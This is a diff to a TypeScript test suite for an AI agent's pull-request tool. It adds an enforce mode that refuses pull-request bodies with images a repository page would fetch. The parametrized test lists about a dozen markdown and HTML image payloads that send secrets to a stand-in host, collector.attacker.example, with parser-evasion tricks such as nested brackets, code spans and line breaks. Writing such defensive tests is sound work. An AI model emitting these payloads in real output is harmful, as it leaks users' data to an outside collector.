@@ -67,6 +67,7 @@ function setup(commands: string[], { machine = true }: { machine?: boolean } = {
 	const spans: Span[] = [];
 	let open: number | null = null;
 	const run = {
+		targets: { tainted: false, trusted: new Set() },
 		toolStarted: (server: string, tool: string, inputBytes: number) => {
 			spans.push({ server, tool, inputBytes, ended: null });
 			return String(spans.length - 1);
@@ -146,10 +147,45 @@ function setup(commands: string[], { machine = true }: { machine?: boolean } = {
 	};
 	/** The spans of the checks, without the one of the tool itself. */
 	const checkSpans = () => spans.filter((span) => span.tool === "check");
-	return { sandbox, settings, proposed, recorded, spans, checkSpans, tool, call, refused };
+	return { sandbox, settings, proposed, recorded, spans, checkSpans, tool, call, refused, run };
 }
 
 describe("a repository without checks", () => {
+	it("sends a body with an outside link to the configured repository in enforce mode", async () => {
+		const { run, call, proposed } = setup([]);
+		run.targets.tainted = true;
+		run.targets.mode = "enforce";
+		const body =
+			"See https://elsewhere.example, [the docs](https://elsewhere.example/docs) and <https://elsewhere.example/api>.";
+		await call({ title: "Fix the cart", body });
+		expect(proposed[0]?.body).toContain(body);
+	});
+	it.each([
+		"![chart](https://collector.attacker.example/?d=secret)",
+		'<img alt="" src="https://collector.attacker.example/p.png">',
+		"![chart][1]\n\n[1]: https://collector.attacker.example/p.png",
+		// An image's description may nest brackets, escape them, or hide one in a code span.
+		"![a [b] c](https://collector.attacker.example/leak?data=SECRET)",
+		"![a \\] b](https://collector.attacker.example/leak)",
+		"![a `]` b](https://collector.attacker.example/leak)",
+		"![a [b](https://elsewhere.example) c](https://collector.attacker.example/leak)",
+		// Code spans, raw HTML and autolinks bind before brackets, so each can hide a `[`.
+		"![a `[b`](https://collector.attacker.example/leak)",
+		"![a `[b` c `](https://collector.attacker.example/leak)",
+		'![a <x y="[b">](https://collector.attacker.example/leak)',
+		"![a <https://x.example/[b>](https://collector.attacker.example/leak)",
+		// Markdown allows any whitespace before a destination, a line break included.
+		`![chart](${" ".repeat(40)}https://collector.attacker.example/leak)`,
+		"![chart](\n   https://collector.attacker.example/leak)",
+	])("refuses an image the repository's page would fetch, in enforce mode: %s", async (body) => {
+		const { run, call, proposed } = setup([]);
+		run.targets.tainted = true;
+		run.targets.mode = "enforce";
+		await expect(call({ title: "Fix the cart", body })).rejects.toThrow(
+			"collector.attacker.example",
+		);
+		expect(proposed).toEqual([]);
+	});
 	it("R1: is proposed as before: one commit and push, the disclosed body and nothing about checks", async () => {
 		const { sandbox, proposed, recorded, spans, call } = setup([]);
 		const outcome = await call();
@@ -209,7 +245,11 @@ describe("a repository without checks", () => {
 			model: "model-1",
 			author: async () => AUTHOR,
 			record: async () => {},
-			run: { toolStarted: () => "span", toolEnded: () => {} } as unknown as RunRecorder,
+			run: {
+				targets: { tainted: false },
+				toolStarted: () => "span",
+				toolEnded: () => {},
+			} as unknown as RunRecorder,
 		});
 		const execute = tools.open_pull_request?.execute as (
 			input: object,
@@ -239,6 +279,7 @@ describe("a repository's checks", () => {
 				},
 				"1".repeat(40),
 				{
+					targets: { tainted: false },
 					toolStarted: () => "span",
 					toolEnded: (_span: string, result: { error: string | null }) => {
 						ended.push(result);
